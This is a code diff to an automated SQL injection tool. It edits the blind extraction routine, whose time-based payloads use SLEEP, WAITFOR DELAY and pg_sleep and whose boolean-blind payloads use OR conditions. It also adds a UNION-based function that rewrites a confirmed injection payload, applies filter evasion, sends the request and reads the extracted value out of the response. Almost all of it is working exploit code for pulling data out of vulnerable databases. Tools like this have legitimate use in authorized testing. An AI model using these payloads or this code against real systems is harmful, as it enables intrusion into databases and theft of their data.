@@ -35,6 +35,8 @@ from __future__ import annotations
 import time
 from typing import Any, Dict, List, Optional
 
+import re as _re
+
 from commonhuman_payloads.sqli import get_extraction_targets  # noqa: F401 (re-exported)
 from ..log import get_logger
 from ..http.injector import Injector
@@ -168,8 +170,7 @@ def _binary_search_char(
                     f" THEN (SELECT 1 FROM pg_sleep({delay})) ELSE 1 END)=1-- -"
                 )
             elif _dbms == "mssql":
-                # MSSQL: WAITFOR DELAY cannot appear inside a SELECT subquery; it
-                # requires a stacked (batched) statement.  Use a stacked IF … WAITFOR.
+                # MSSQL: WAITFOR DELAY cannot appear inside a SELECT subquery
                 time_true_pl = (
                     f"'; IF ({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid})"
                     f" WAITFOR DELAY '0:0:{delay}'-- -"
@@ -182,8 +183,7 @@ def _binary_search_char(
                     f" (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<1000000) SELECT x FROM r)) ELSE 1 END)=1-- -"
                 )
             else:
-                # MySQL / MariaDB / auto: OR scalar subquery avoids the missing-row
-                # problem — SLEEP fires once even when base record doesn't exist.
+                # MySQL / MariaDB / auto: OR scalar subquery avoids the missing-row issue of time-based conditions
                 time_true_pl = (
                     f"' OR (SELECT IF({ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}"
                     f",SLEEP({delay}),0))-- -"
@@ -198,10 +198,6 @@ def _binary_search_char(
             condition_true = elapsed >= opts.time_threshold
         else:
             # Boolean-blind: OR-based single probe compared against baseline.
-            # OR fires regardless of whether the base record exists, matching
-            # the boolean-detection payloads that confirmed this channel.
-            # Condition true  → all rows returned → response differs from baseline.
-            # Condition false → no rows (base record absent) → same as baseline.
             probe_payload = f"' OR {ord_fn}({substr_fn}(({expr}),{pos},1))>{mid}-- -"
             probe_pl = apply_evasion(probe_payload, evasion)
 
@@ -224,3 +220,56 @@ def _binary_search_char(
     if ordinal < _ASCII_MIN or ordinal > _ASCII_MAX:
         return ordinal  # caller handles out-of-range (end of string / NULL)
     return ordinal
+
+
+_UNION_PREFIX = "BSQL_OUT_"
+_UNION_SUFFIX = "_BSQL_END"
+_MARKER_RE    = _re.compile(r"'BreachSQL_[^']*'")
+
+
+def extract_via_union(
+    expr: str,
+    union_finding,
+    surface: Dict[str, Any],
+    evasions: List[str],
+    opts: ScanOptions,
+    injector: Injector,
+) -> str:
+    """
+    Extract a single SQL expression using a confirmed UNION injection.
+    One request per expression — no binary search needed.
+    """
+    evasion = evasions[0] if evasions else EVASION_NONE
+    dbms    = (opts.dbms or "auto").lower()
+
+    if dbms in ("sqlite", "postgres", "postgresql", "oracle"):
+        cast   = f"CAST(({expr}) AS TEXT)"
+        concat = f"'{_UNION_PREFIX}'||{cast}||'{_UNION_SUFFIX}'"
+    elif dbms == "mssql":
+        cast   = f"CAST(({expr}) AS NVARCHAR(MAX))"
+        concat = f"'{_UNION_PREFIX}'+{cast}+'{_UNION_SUFFIX}'"
+    else:
+        cast   = f"CAST(({expr}) AS CHAR)"
+        concat = f"CONCAT('{_UNION_PREFIX}',{cast},'{_UNION_SUFFIX}')"
+
+    new_payload = _MARKER_RE.sub(concat, union_finding.payload, count=1)
+    if new_payload == union_finding.payload:
+        return ""
+
+    new_payload = apply_evasion(new_payload, evasion)
+
+    url        = surface["url"]
+    method     = surface["method"]
+    params     = surface["params"]
+    param      = surface["single_param"]
+    json_body  = surface.get("json_body", False)
+    path_index = surface.get("path_index", 0)
+    second_url = getattr(opts, "second_url", "")
+
+    resp = _fetch(injector, url, method, params, param, new_payload,
+                  second_url=second_url, json_body=json_body, path_index=path_index)
+    if not resp:
+        return ""
+
+    m = _re.search(_re.escape(_UNION_PREFIX) + r"(.*?)" + _re.escape(_UNION_SUFFIX), resp)
+    return m.group(1) if m else ""
